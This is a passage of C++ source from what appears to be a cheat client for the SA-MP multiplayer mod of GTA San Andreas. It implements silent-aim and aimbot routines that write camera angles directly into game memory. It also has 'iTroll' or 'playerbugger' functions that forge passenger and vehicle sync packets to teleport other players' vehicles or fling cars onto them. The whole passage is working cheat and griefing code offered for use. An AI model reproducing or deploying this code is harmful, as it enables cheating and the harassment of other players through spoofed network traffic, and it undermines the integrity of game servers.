							if (vehicleEntry != NULL)
							{
								
								int iVehicleID = getVehicleGTAIDFromInterface((DWORD*)pCVehicleTeleport->GetInterface());
								struct vehicle_info * vinfo = vehicle_info_get(iVehicleID, 0);
								struct actor_info * tinfo = vinfo->passengers[0];
								if (tinfo != NULL) {
									aimidf = getSAMPPlayerIDFromGTAPed(tinfo);
									cheat_state->_generic.RealAIMID = aimidf;
									cheat_state->_generic.TypeAIMID = 1;
								}
								else {
									//I PREFER AIM ONLY PEDS AND DRIVERS, UNCOMMENT FOR EMPTY VEHICLES OR CHANGE LOGIC
									//cheat_state_text("collision %d", translateGTASAMP_pedPool.iSAMPID[iActorID]);
									/*aimidf = translateGTASAMP_vehiclePool.iSAMPID[iVehicleID];
									cheat_state->RealAIMID = aimidf;
									cheat_state->TypeAIMID = 2;*/
									//fix not empty cars
								}

								
							}
						}
					}

					//IS ACTOR????
					else if (pCollisionEntity && pCollisionEntity->nType == ENTITY_TYPE_PED)
					{
						pCPedTeleport = pGameInterface->GetPools()->GetPed((DWORD *)pCollisionEntity);
						if (pCPedTeleport)
						{
							//vecGroundPos = *pCPedTeleport->GetPosition();
							int iActorID = getPedGTAIDFromInterface((DWORD*)pCPedTeleport->GetInterface());

							if (iActorID != NULL)
							{
								//sprintf(buf, "Aim-menu (%d)", translateGTASAMP_pedPool.iSAMPID[iActorID]);
								aimidf = translateGTASAMP_pedPool.iSAMPID[iActorID];
								cheat_state->_generic.RealAIMID = aimidf;
								cheat_state->_generic.TypeAIMID = 1;
							}
						}
					}

				}
				
				//KTXBYE
				pCollision->Destroy();
				
				//DRAW EXECUTION BOX WHILE AIMING
				if (cheat_state->_generic.TypeAIMID == 1)
				{
					D3DXVECTOR3 poss, screenposs;

					struct actor_info	*nearest;
					if ((nearest = getGTAPedFromSAMPPlayerID(cheat_state->_generic.RealAIMID)) != NULL)
					{

						poss.x = nearest->base.matrix[(3 * 4) * 1];
						poss.y = nearest->base.matrix[(3 * 4) + 1];
						poss.z = nearest->base.matrix[(3 * 4) + 2];
						CalcScreenCoors(&poss, &screenposs);
						//IS PLAYER IN THE FRAME?
						if ((screenposs.x  < silentAimMargins[0] + (pPresentParam.BackBufferWidth * cheat_state->_generic.silentFrameX)
						  && screenposs.x  > silentAimMargins[0] - (pPresentParam.BackBufferWidth * cheat_state->_generic.silentFrameX))
								  &&
							(screenposs.y /*+ 15.0f*/ < silentAimMargins[1] + (pPresentParam.BackBufferHeight * cheat_state->_generic.silentFrameY)
						  && screenposs.y /*+ 15.0f*/ > silentAimMargins[1] - (pPresentParam.BackBufferHeight * cheat_state->_generic.silentFrameY)))
						{
							cheat_state->_generic.silentAIMsafe = true;
							//YEA
							if (cheat_state->_generic.silentFrame)
							render->D3DBoxBorder(
								silentAimMargins[0] - (pPresentParam.BackBufferWidth * cheat_state->_generic.silentFrameX),
								silentAimMargins[1] - (pPresentParam.BackBufferHeight * cheat_state->_generic.silentFrameY),
								(pPresentParam.BackBufferWidth * (cheat_state->_generic.silentFrameX * 2)), (pPresentParam.BackBufferHeight * (cheat_state->_generic.silentFrameY * 2)),
								D3DCOLOR_ARGB(255, 255, 255, 255), D3DCOLOR_ARGB(0, 0, 0, 0));
						}

					
						else 
						{
							cheat_state->_generic.silentAIMsafe = false;
							//NOPE
							if (cheat_state->_generic.silentFrame)
							render->D3DBoxBorder(
								silentAimMargins[0] - (pPresentParam.BackBufferWidth * cheat_state->_generic.silentFrameX),
								silentAimMargins[1] - (pPresentParam.BackBufferHeight * cheat_state->_generic.silentFrameY),
								(pPresentParam.BackBufferWidth * (cheat_state->_generic.silentFrameX * 2)), (pPresentParam.BackBufferHeight * (cheat_state->_generic.silentFrameY * 2)),
								D3DCOLOR_ARGB(255, 255, 0, 0), D3DCOLOR_ARGB(0, 0, 0, 0));
						}
					}
				}

				//cheat_state_text("playerzone %d    %0.2f  %0.2f       %0.2f  %0.2f  ", cheat_state->RealAIMID, g_playerTagInfo[cheat_state->RealAIMID].tagPosition.fX, g_playerTagInfo[cheat_state->RealAIMID].tagPosition.fY + 35.0f, silentAimMargins[0], silentAimMargins[1]);
				//LETS HANDLE AIMBOTZ
				if (info->weapon_model != 358) {
					//SKIN AIMBOT
					if (cheat_state->_generic.TypeAIMID == 1 && cheat_state->_generic.skinAimbot) {
						struct actor_info	*nearest;
						if ((nearest = getGTAPedFromSAMPPlayerID(cheat_state->_generic.RealAIMID)) != NULL)
							skin_aimbot(info, nearest);
					}
					//CAR AIMBOT
					if (cheat_state->_generic.TypeAIMID == 2 && cheat_state->_generic.carAimbot) {
						struct vehicle_info	*nearest;
						if ((nearest = getGTAVehicleFromSAMPVehicleID(cheat_state->_generic.RealAIMID)) != NULL)
							car_aimbot(info, nearest);
					}

				}
				else {

					//SNIPER SKIN AIMBOT
					if (cheat_state->_generic.TypeAIMID == 1 && cheat_state->_generic.sniperAimbot) {
						static float		adj_rx, adj_rz, prev_rx, prev_rz;
						float				rx = *(float *)0x00B6F248;
						float				rz = *(float *)0x00B6F258;
						static int prev_id;
						float				vect[3], ax, az;
						struct actor_info	*nearest;

						if ((nearest = getGTAPedFromSAMPPlayerID(cheat_state->_generic.RealAIMID)) == NULL)
							return; // won't happen

						// calculate distance vector

						float nearestmatrix[3];
						nearestmatrix[0] = nearest->base.matrix[1 * (4 * 3)];
						nearestmatrix[1] = nearest->base.matrix[1 + (4 * 3)];
						nearestmatrix[2] = nearest->base.matrix[2 + (4 * 3)];

						float mymatrix[3];

						mymatrix[0] = vecOrigin.fX;
						mymatrix[1] = vecOrigin.fY;
						mymatrix[2] = vecOrigin.fZ;

						vect3_vect3_sub(nearestmatrix, &info->base.matrix[4 * 3], vect);

						// z angle
						az = atan2f(vect[0], vect[1]);

						// rotate around z axis
						vect[1] = sinf(az) * vect[0] + cosf(az) * vect[1];

						// x angle
						ax = atan2f(vect[1], vect[2]);

						ax = -ax + M_PI / 2.0f;// +adj_rx;
						az = -az - M_PI / 2.0f;// +adj_rz;

						ax = ax - 0.002f;
						//az = az + 0.022f;

						if (ax < -M_PI)
							ax = -M_PI;
						else if (ax > M_PI)
							ax = M_PI;

						*(float *)0x00B6F248 = ax;// -0.150f;
						*(float *)0x00B6F258 = az;// +0.038f;

					}

					//SNIPPER CAR AIMBOT
					if (cheat_state->_generic.TypeAIMID == 2 && cheat_state->_generic.sniperAimbot)
					{
						static float		adj_rx, adj_rz, prev_rx, prev_rz;
						float				rx = *(float *)0x00B6F248;
						float				rz = *(float *)0x00B6F258;
						static int prev_id;
						float				vect[3], ax, az;
						struct vehicle_info	*nearest;
						//b6f258

						//pGameInterface->GetCamera()->Find3rdPersonCamTargetVector()
						if ((nearest = getGTAVehicleFromSAMPVehicleID(cheat_state->_generic.RealAIMID)) == NULL)
							return; // won't happen

						// calculate distance vector

						float nearestmatrix[3];
						nearestmatrix[0] = nearest->base.matrix[1 * (4 * 3)];
						nearestmatrix[1] = nearest->base.matrix[1 + (4 * 3)];
						nearestmatrix[2] = nearest->base.matrix[2 + (4 * 3)];


						float mymatrix[3];

						mymatrix[0] = vecOrigin.fX;
						mymatrix[1] = vecOrigin.fY;
						mymatrix[2] = vecOrigin.fZ;

						vect3_vect3_sub(nearestmatrix, mymatrix, vect);


						// z angle
						az = atan2f(vect[0], vect[1]);

						// rotate around z axis
						vect[1] = sinf(az) * vect[0] + cosf(az) * vect[1];

						// x angle
						ax = atan2f(vect[1], vect[2]);

						ax = -ax + M_PI / 2.0f;// +adj_rx;
						az = -az - M_PI / 2.0f;// +adj_rz;
						//cheat_state_text("aimm %0.2f %0.2f", ax, az);

						//ax = ax - 0.078f;
						//az = az + 0.048f;

						if (ax < -M_PI)
							ax = -M_PI;
						else if (ax > M_PI)
							ax = M_PI;

						// XXX make function
						*(float *)0x00B6F248 = ax;
						*(float *)0x00B6F258 = az;
					}
				}
			}
			
			//vecGroundPos = *pCollision->GetPosition();
			//cheat_state_text("collision ID(%d)         %0.2f    %0.2f     Distance(%0.2f)", aimidf, (float)poss.x, (float)poss.y, vect3_dist(&vecOrigin.fX, &vecGroundPos.fX));

			CVector lol;
			lol.fX = 0;
			lol.fY = 0;
			lol.fZ = 0;

			//save current aim status SHITY DATA NOT NECXCESARY BUT OK
			float posss[3];
			if (cheat_state->_generic.TypeAIMID == 1) {
				if (getPlayerPos(cheat_state->_generic.RealAIMID, posss)) {
					cheat_state->_generic.CurrentAIMstreamed = true;
					cheat_state->_generic.CurrentAIMstreamed = 1;
					cheat_state->_generic.DistanceAIM = vect3_dist(cheat_state->actor.coords, posss);

					lol.fX = posss[0];
					lol.fY = posss[1];
					lol.fZ = posss[2];
					//cheat_state_text("collision ID(%d)         %0.2f    %0.2f     Distance(%0.2f) Distance(%0.2f)", aimidf, (float)poss.x, (float)poss.y, vect3_dist(&vecOrigin.fX, &vecGroundPos.fX), cheat_state->DistanceAIM);
				}
				else {
					cheat_state->_generic.CurrentAIMstreamed = false;
					cheat_state->_generic.DistanceAIM = 0.0f;
				}
			}

			if (cheat_state->_generic.TypeAIMID == 2) {
				if (g_Vehicles->pSAMP_Vehicle[cheat_state->_generic.RealAIMID] != NULL) {
					cheat_state->_generic.CurrentAIMstreamed = true;
					cheat_state->_generic.DistanceAIM = vect3_dist(cheat_state->actor.coords, &g_Vehicles->pSAMP_Vehicle[cheat_state->_generic.RealAIMID]->pGTA_Vehicle->base.matrix[4 * 3]);
					lol.fX = g_Vehicles->pSAMP_Vehicle[cheat_state->_generic.RealAIMID]->pGTA_Vehicle->base.matrix[4 * 3];
					lol.fY = g_Vehicles->pSAMP_Vehicle[cheat_state->_generic.RealAIMID]->pGTA_Vehicle->base.matrix[13];
					lol.fZ = g_Vehicles->pSAMP_Vehicle[cheat_state->_generic.RealAIMID]->pGTA_Vehicle->base.matrix[14];
				}
				else {
					cheat_state->_generic.CurrentAIMstreamed = false;
					cheat_state->_generic.DistanceAIM = 0.0f;
				}
			}


		isOldAimKeyDown = isAimKeyDown;

		//DRAW TAG ON PLYER
		if (cheat_state->_generic.TypeAIMID==1)
		{
			D3DXVECTOR3 poss, screenposs;

			struct actor_info	*nearest;
			if ((nearest = getGTAPedFromSAMPPlayerID(cheat_state->_generic.RealAIMID)) != NULL)
			{
				poss.x = nearest->base.matrix[(3 * 4) * 1];
				poss.y = nearest->base.matrix[(3 * 4) + 1];
				poss.z = nearest->base.matrix[(3 * 4) + 2];

				CalcScreenCoors(&poss, &screenposs);

				//IS PLAYER ON SCREEN?
				if ((screenposs.x  < (pPresentParam.BackBufferWidth)
					&& screenposs.x  > 0)
					&&
					(screenposs.y < (pPresentParam.BackBufferHeight)
					&& screenposs.y > 0)
					&& screenposs.z>0.0f)
				{
					char AIMText[] = "AIM";
		
					float w = pD3DFontFixedSmall->DrawLength(AIMText);
					float h = pD3DFontFixedSmall->DrawHeight() + 1;
					render->D3DBox(screenposs.x - 20.0f + 1.0f, screenposs.y - 1.5f, pD3DFont_sampStuff->DrawLength(AIMText) + 1.2f, 10.0f, D3DCOLOR_ARGB(255, 0, 0, 0));
					pD3DFontFixedSmall->PrintShadow(screenposs.x - 17.0f + 1.0f, screenposs.y - h + 8.5f, D3DCOLOR_ARGB(130, 170, 170, 0), AIMText);
				}
			}
		}
	}
}	




void cheat_iTrolls()
{
	traceLastFunc( "cheat_itroll()" );
    if( cheat_state->_generic.itrolls == 1 )
    {
	traceLastFunc( "cheat_handle_playerbugger()" );

	if(g_SAMP == NULL || g_SAMP->iGameState != GAMESTATE_CONNECTED)
		return;

	if( cheat_state->_generic.playerbugger_incars == 1 )
	{
		struct actor_info *self = actor_info_get( ACTOR_SELF, 0 );

		static int iPlayerID;

		if ( g_Players->iIsListed[iPlayerID] != 1
			||  g_Players->pRemotePlayer[iPlayerID] == NULL
			||  g_Players->pRemotePlayer[iPlayerID]->pPlayerData == NULL
			||  g_Players->pRemotePlayer[iPlayerID]->pPlayerData->pSAMP_Actor == NULL
			||  g_Players->pRemotePlayer[iPlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped == NULL
			||  getPlayerSAMPVehicleID(iPlayerID) == NULL
			||  getPlayerSAMPVehicleID(iPlayerID) == g_Players->pLocalPlayer->sCurrentVehicleID
			||  getPlayerState(iPlayerID) != PLAYER_STATE_DRIVER && getPlayerState(iPlayerID) != PLAYER_STATE_PASSENGER )
			goto find_another_player;

		struct vehicle_info *vinfo = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->vehicle;

		int iSAMPVehicleID;

		if ( vinfo == vehicle_info_get(VEHICLE_SELF, 0) && vinfo->passengers[0] != self )
			iSAMPVehicleID = g_Players->pLocalPlayer->passengerData.sVehicleID;
		else
			iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);

		if(iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID/* || iSAMPVehicleID == g_Players->pLocalPlayer->passengerData.sVehicleID*/)
		{
			iPlayerID++;
			goto find_another_player;
		}

		if ( KEY_PRESSED(VK_LBUTTON) )
		{
			struct actor_info *pSelfActor = actor_info_get( ACTOR_SELF, 0 );

			BYTE byteCurrentWeap;

			if ( cheat_state->state == CHEAT_STATE_VEHICLE )
				byteCurrentWeap = g_Players->pLocalPlayer->inCarData.byteCurrentWeapon;

			else if ( cheat_state->state == CHEAT_STATE_ACTOR )
				byteCurrentWeap = g_Players->pLocalPlayer->onFootData.byteCurrentWeapon;

			else byteCurrentWeap = 0;

			bool bWasInVehicle = pSelfActor->pedFlags.bInVehicle;

			pSelfActor->pedFlags.bInVehicle = true;

			float fPos[3];
			vect3_copy(&self->base.matrix[4 * 3], fPos);

			fPos[0] = 0.75f + 99.9f;
			fPos[1] = 0.75f + 99.9f;
			fPos[2] = 0.75f + 99.9f;

			float fSpeed[3];
			fSpeed[0] = cam_matrix[4] * 60.0f;
			fSpeed[1] = cam_matrix[5] * 60.0f;
			fSpeed[2] = cam_matrix[6] * 60.0f;

			 BitStream bsPassengerSync;
			 BitStream bsInCarSync;

			stInCarData InCarData;
			stPassengerData PassengerData;

			InCarData.sVehicleID = iSAMPVehicleID;
			PassengerData.sVehicleID = iSAMPVehicleID;

			InCarData.fVehicleHealth = vinfo->hitpoints;

			InCarData.bytePlayerHealth = pSelfActor->hitpoints;
			PassengerData.byteHealth = pSelfActor->hitpoints;

			InCarData.byteArmor = pSelfActor->armor;
			PassengerData.byteArmor = pSelfActor->armor;

			InCarData.byteCurrentWeapon = byteCurrentWeap;
			PassengerData.byteCurrentWeapon = byteCurrentWeap;

			InCarData.sTrailerID = g_SAMP->pPools.pPool_Player->pRemotePlayer[iPlayerID]->pPlayerData->inCarData.sTrailerID;

			vect3_copy(vinfo->base.coords, InCarData.fPosition);
			vect3_copy(vinfo->base.coords, PassengerData.fPosition);

			PassengerData.byteSeatID = 1;

			bsPassengerSync.Write((BYTE)ID_PASSENGER_SYNC);
			bsPassengerSync.Write((PCHAR)&PassengerData,sizeof(stPassengerData));

			vect3_copy(fPos, InCarData.fPosition);
			vect3_copy(fSpeed, InCarData.fMoveSpeed);

			bsInCarSync.Write((BYTE)ID_VEHICLE_SYNC);
			bsInCarSync.Write((PCHAR)&InCarData,sizeof(stInCarData));

			
			g_DrifeitClient->Send(&bsPassengerSync, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);

			
			g_DrifeitClient->Send(&bsInCarSync, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);

			pSelfActor->pedFlags.bInVehicle = bWasInVehicle;

			iPlayerID++;
		}

find_another_player:
	for ( iPlayerID; iPlayerID < SAMP_PLAYER_MAX; iPlayerID++ )
	{
		if ( g_Players->iIsListed[iPlayerID] == 1
			&&  g_Players->pRemotePlayer[iPlayerID] != NULL
			&&  g_Players->pRemotePlayer[iPlayerID]->pPlayerData != NULL
			&&  g_Players->pRemotePlayer[iPlayerID]->pPlayerData->pSAMP_Actor != NULL
			&&  g_Players->pRemotePlayer[iPlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped != NULL
			&&  getPlayerSAMPVehicleID(iPlayerID) != NULL
			&&  getPlayerSAMPVehicleID(iPlayerID) != g_Players->pLocalPlayer->sCurrentVehicleID
			&&  getPlayerState(iPlayerID) == PLAYER_STATE_DRIVER || getPlayerState(iPlayerID) == PLAYER_STATE_PASSENGER)
		break;
	}

	if ( iPlayerID >= SAMP_PLAYER_MAX )
		iPlayerID = 0;
	}

}}

void cheat_handle_itroll_targetfinders ()
{
	traceLastFunc( "cheat_handle_itroll_targetfinder()" );
   
	if(cheat_state->state == CHEAT_STATE_NONE)
		return;

	if(!g_SAMP || !g_Players || !g_Vehicles)
		return;

	int iPlayerID = cheat_state->_generic.playerbugger_onfoot_targetids;

	static unsigned short usFoundVehicleID = 0xFFFF;
	static DWORD dwVehicleFoundTick = GetTickCount();

	stInCarData sync;
	 BitStream bsVehicleSync;

	float pos[3] = { pPedSelf->GetPosition()->fX, pPedSelf->GetPosition()->fY, pPedSelf->GetPosition()->fZ };
	
	struct actor_info *self = actor_info_get(ACTOR_SELF, ACTOR_ALIVE);

	if(cheat_state->_generic.playerbugger_onfoots)
	{
		if ( iPlayerID < 0 || iPlayerID > SAMP_PLAYER_MAX )
			return;

		if(g_Players->sLocalPlayerID == iPlayerID ||g_Players->pRemotePlayer[iPlayerID] == NULL)
			return;

		if (getPlayerState(iPlayerID) != PLAYER_STATE_ONFOOT && getPlayerState(iPlayerID) != PLAYER_STATE_DRIVER)
			return;

		if(usFoundVehicleID != 0xFFFF)
		{
			if(!ValidVehiclez(usFoundVehicleID))
			{
				usFoundVehicleID = 0xFFFF;
				return;
			}

			if(dwVehicleFoundTick < GetTickCount() - 50)
			{
				self->vehicle = g_Vehicles->pGTA_Vehicle[usFoundVehicleID];

				memset(&sync, 0, sizeof(stInCarData));

				sync.sVehicleID = usFoundVehicleID;
				sync.fVehicleHealth = g_Vehicles->pGTA_Vehicle[usFoundVehicleID]->hitpoints;

				sync.bytePlayerHealth = self->hitpoints;
				sync.byteArmor = self->armor;

				sync.fQuaternion[0] = 0.707107;
				sync.fQuaternion[1] = -0.707107;
				sync.fQuaternion[2] = -0.707107;
				sync.fQuaternion[3] = -0.707107;
				
				sync.fPosition[0] = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->onFootData.fPosition[0];
				sync.fPosition[1] = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->onFootData.fPosition[1];
				sync.fPosition[2] = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->onFootData.fPosition[2];

				sync.fMoveSpeed[0] = cam_matrix[4] * 60.0f;
				sync.fMoveSpeed[1] = cam_matrix[5] * 60.0f;
				sync.fMoveSpeed[2] = cam_matrix[6] * 60.0f;

				cheat_vehicle_teleport(g_Vehicles->pGTA_Vehicle[usFoundVehicleID], sync.fPosition, 0);

				GTAfunc_RemoveActorFromCarAndPutAt(pos);

				bsVehicleSync.Reset();
				bsVehicleSync.Write((BYTE)ID_VEHICLE_SYNC);
				bsVehicleSync.Write((PCHAR)&sync,sizeof(stInCarData));

				
				g_DrifeitClient->Send(&bsVehicleSync, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);

				usFoundVehicleID = 0xFFFF;
				return;
			}
		}

		int iClosestVehicleGTAID = vehicle_find_nearest( VEHICLE_ALIVE + VEHICLE_NOTBURNING );
		struct vehicle_info *pSlapperVehicle = vehicle_info_get( iClosestVehicleGTAID, 0 );
		unsigned short usClosestVehicleSAMPID = getSAMPVehicleIDFromGTAVehicle(pSlapperVehicle);

		if(!ValidVehiclez(usClosestVehicleSAMPID))
			return;

		if(KEY_PRESSED(VK_LBUTTON))
		{
			if(usFoundVehicleID == 0xFFFF)
			{
				self->vehicle = pSlapperVehicle;

				memset(&sync, 0, sizeof(stInCarData));

				sync.sVehicleID = usClosestVehicleSAMPID;
				sync.fVehicleHealth = pSlapperVehicle->hitpoints;
				sync.bytePlayerHealth = self->hitpoints;
				sync.byteArmor = self->armor;
						
				sync.fQuaternion[0] = 0.707107;
				sync.fQuaternion[1] = -0.707107;
				sync.fQuaternion[2] = 0;
				sync.fQuaternion[3] = 0;

				sync.fPosition[0] = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->onFootData.fPosition[0];
				sync.fPosition[1] = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->onFootData.fPosition[1]; 
				sync.fPosition[2] = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->onFootData.fPosition[2] - 0.75f;
					
				cheat_vehicle_teleport(pSlapperVehicle, sync.fPosition, 0);

				pSlapperVehicle->base.matrixStruct->right.X = 1;
				pSlapperVehicle->base.matrixStruct->right.Y = 1;
				pSlapperVehicle->base.matrixStruct->right.Z = 1;

				pSlapperVehicle->base.matrixStruct->up.Z = 1;

				GTAfunc_RemoveActorFromCarAndPutAt(pos);

				bsVehicleSync.Reset();
				bsVehicleSync.Write((BYTE)ID_VEHICLE_SYNC);
				bsVehicleSync.Write((PCHAR)&sync,sizeof(stInCarData));

	
				g_DrifeitClient->Send(&bsVehicleSync, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);

				usFoundVehicleID = sync.sVehicleID;
				dwVehicleFoundTick = GetTickCount();
			}
		}
	}
}














void cheat_iTrollc()
{
	traceLastFunc( "cheat_itrollc()" );
    if( cheat_state->_generic.itrollc == 1 )
    {
	traceLastFunc( "cheat_handle_playerbugger()" );

	if(g_SAMP == NULL || g_SAMP->iGameState != GAMESTATE_CONNECTED)
		return;

	if( cheat_state->_generic.playerbugger_incarc == 1 )
	{
		struct actor_info *self = actor_info_get( ACTOR_SELF, 0 );

		static int iPlayerID;

		if ( g_Players->iIsListed[iPlayerID] != 1
			||  g_Players->pRemotePlayer[iPlayerID] == NULL
			||  g_Players->pRemotePlayer[iPlayerID]->pPlayerData == NULL
			||  g_Players->pRemotePlayer[iPlayerID]->pPlayerData->pSAMP_Actor == NULL
			||  g_Players->pRemotePlayer[iPlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped == NULL
			||  getPlayerSAMPVehicleID(iPlayerID) == NULL
			||  getPlayerSAMPVehicleID(iPlayerID) == g_Players->pLocalPlayer->sCurrentVehicleID
			||  getPlayerState(iPlayerID) != PLAYER_STATE_DRIVER && getPlayerState(iPlayerID) != PLAYER_STATE_PASSENGER )
			goto find_another_player;

		struct vehicle_info *vinfo = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->vehicle;

		int iSAMPVehicleID;

		if ( vinfo == vehicle_info_get(VEHICLE_SELF, 0) && vinfo->passengers[0] != self )
			iSAMPVehicleID = g_Players->pLocalPlayer->passengerData.sVehicleID;
		else
			iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);

		if(iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID/* || iSAMPVehicleID == g_Players->pLocalPlayer->passengerData.sVehicleID*/)
		{
			iPlayerID++;
			goto find_another_player;
		}

		if ( KEY_PRESSED(VK_LBUTTON) )
		{
			struct actor_info *pSelfActor = actor_info_get( ACTOR_SELF, 0 );

			BYTE byteCurrentWeap;

			if ( cheat_state->state == CHEAT_STATE_VEHICLE )
				byteCurrentWeap = g_Players->pLocalPlayer->inCarData.byteCurrentWeapon;

			else if ( cheat_state->state == CHEAT_STATE_ACTOR )
				byteCurrentWeap = g_Players->pLocalPlayer->onFootData.byteCurrentWeapon;

			else byteCurrentWeap = 0;

			bool bWasInVehicle = pSelfActor->pedFlags.bInVehicle;

			pSelfActor->pedFlags.bInVehicle = true;

			float fPos[3];
			vect3_copy(&self->base.matrix[4 * 3], fPos);

			fPos[0] += 19300.20;
			fPos[1] += -5042.15;
			fPos[2] += 94.11;

			float fSpeed[3];
			fSpeed[0] = cam_matrix[4] * 6.0f;
			fSpeed[1] = cam_matrix[5] * 6.0f;
			fSpeed[2] = cam_matrix[6] * 6.0f;

			 BitStream bsPassengerSync;
			 BitStream bsInCarSync;

			stInCarData InCarData;
			stPassengerData PassengerData;

			InCarData.sVehicleID = iSAMPVehicleID;
			PassengerData.sVehicleID = iSAMPVehicleID;

			InCarData.fVehicleHealth = vinfo->hitpoints;

			InCarData.bytePlayerHealth = pSelfActor->hitpoints;
			PassengerData.byteHealth = pSelfActor->hitpoints;

			InCarData.byteArmor = pSelfActor->armor;
			PassengerData.byteArmor = pSelfActor->armor;

			InCarData.byteCurrentWeapon = byteCurrentWeap;
			PassengerData.byteCurrentWeapon = byteCurrentWeap;

			InCarData.sTrailerID = g_SAMP->pPools.pPool_Player->pRemotePlayer[iPlayerID]->pPlayerData->inCarData.sTrailerID;

			vect3_copy(vinfo->base.coords, InCarData.fPosition);
			vect3_copy(vinfo->base.coords, PassengerData.fPosition);

			PassengerData.byteSeatID = 1;

			bsPassengerSync.Write((BYTE)ID_PASSENGER_SYNC);
			bsPassengerSync.Write((PCHAR)&PassengerData,sizeof(stPassengerData));

			vect3_copy(fPos, InCarData.fPosition);
			vect3_copy(fSpeed, InCarData.fMoveSpeed);

			bsInCarSync.Write((BYTE)ID_VEHICLE_SYNC);
			bsInCarSync.Write((PCHAR)&InCarData,sizeof(stInCarData));

			
			g_DrifeitClient->Send(&bsPassengerSync, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);

			
			g_DrifeitClient->Send(&bsInCarSync, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);

			pSelfActor->pedFlags.bInVehicle = bWasInVehicle;

			iPlayerID++;
		}

find_another_player:
	for ( iPlayerID; iPlayerID < SAMP_PLAYER_MAX; iPlayerID++ )
	{
		if ( g_Players->iIsListed[iPlayerID] == 1
			&&  g_Players->pRemotePlayer[iPlayerID] != NULL
			&&  g_Players->pRemotePlayer[iPlayerID]->pPlayerData != NULL
			&&  g_Players->pRemotePlayer[iPlayerID]->pPlayerData->pSAMP_Actor != NULL
			&&  g_Players->pRemotePlayer[iPlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped != NULL
			&&  getPlayerSAMPVehicleID(iPlayerID) != NULL
			&&  getPlayerSAMPVehicleID(iPlayerID) != g_Players->pLocalPlayer->sCurrentVehicleID
			&&  getPlayerState(iPlayerID) == PLAYER_STATE_DRIVER || getPlayerState(iPlayerID) == PLAYER_STATE_PASSENGER)
		break;
	}

	if ( iPlayerID >= SAMP_PLAYER_MAX )
		iPlayerID = 0;
	}

}}

void cheat_handle_itroll_targetfinderc ()
{
	traceLastFunc( "cheat_handle_itroll_targetfinder()" );
   
	if(cheat_state->state == CHEAT_STATE_NONE)
		return;

	if(!g_SAMP || !g_Players || !g_Vehicles)
		return;

	int iPlayerID = cheat_state->_generic.playerbugger_onfoot_targetidc;

	static unsigned short usFoundVehicleID = 0xFFFF;
	static DWORD dwVehicleFoundTick = GetTickCount();

	stInCarData sync;
	 BitStream bsVehicleSync;

	float pos[3] = { pPedSelf->GetPosition()->fX, pPedSelf->GetPosition()->fY, pPedSelf->GetPosition()->fZ };
	
	struct actor_info *self = actor_info_get(ACTOR_SELF, ACTOR_ALIVE);

	if(cheat_state->_generic.playerbugger_onfootc)
	{
		if ( iPlayerID < 0 || iPlayerID > SAMP_PLAYER_MAX )
			return;

		if(g_Players->sLocalPlayerID == iPlayerID ||g_Players->pRemotePlayer[iPlayerID] == NULL)
			return;

		if (getPlayerState(iPlayerID) != PLAYER_STATE_ONFOOT && getPlayerState(iPlayerID) != PLAYER_STATE_DRIVER)
			return;

		if(usFoundVehicleID != 0xFFFF)
		{
			if(!ValidVehiclez(usFoundVehicleID))
			{
				usFoundVehicleID = 0xFFFF;
				return;
			}

			if(dwVehicleFoundTick < GetTickCount() - 50)
			{
				self->vehicle = g_Vehicles->pGTA_Vehicle[usFoundVehicleID];

				memset(&sync, 0, sizeof(stInCarData));

				sync.sVehicleID = usFoundVehicleID;
				sync.fVehicleHealth = g_Vehicles->pGTA_Vehicle[usFoundVehicleID]->hitpoints;

				sync.bytePlayerHealth = self->hitpoints;
				sync.byteArmor = self->armor;

				sync.fQuaternion[0] = 0.707107;
				sync.fQuaternion[1] = -0.707107;
				sync.fQuaternion[2] = 0;
				sync.fQuaternion[3] = 0;
				
				sync.fPosition[0] = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->onFootData.fPosition[0] + 19300.20;
				sync.fPosition[1] = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->onFootData.fPosition[1] + -5042.15;
				sync.fPosition[2] = g_Players->pRemotePlayer[iPlayerID]->pPlayerData->onFootData.fPosition[2] - 0.75f + 94.11;

				sync.fMoveSpeed[0] = cam_matrix[4] * 6.0f;
				sync.fMoveSpeed[1] = cam_matrix[5] * 6.0f;
				sync.fMoveSpeed[2] = cam_matrix[6] * 6.0f;

				cheat_vehicle_teleport(g_Vehicles->pGTA_Vehicle[usFoundVehicleID], sync.fPosition, 0);

				GTAfunc_RemoveActorFromCarAndPutAt(pos);

				bsVehicleSync.Reset();
				bsVehicleSync.Write((BYTE)ID_VEHICLE_SYNC);
				bsVehicleSync.Write((PCHAR)&sync,sizeof(stInCarData));

				
				g_DrifeitClient->Send(&bsVehicleSync, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);

				usFoundVehicleID = 0xFFFF;
				return;
			}
		}

		int iClosestVehicleGTAID = vehicle_find_nearest( VEHICLE_ALIVE + VEHICLE_NOTBURNING );
		struct vehicle_info *pSlapperVehicle = vehicle_info_get( iClosestVehicleGTAID, 0 );
		unsigned short usClosestVehicleSAMPID = getSAMPVehicleIDFromGTAVehicle(pSlapperVehicle);

		if(!ValidVehiclez(usClosestVehicleSAMPID))
			return;

		if(KEY_PRESSED(VK_LBUTTON))
		{
			if(usFoundVehicleID == 0xFFFF)
			{
				self->vehicle = pSlapperVehicle;

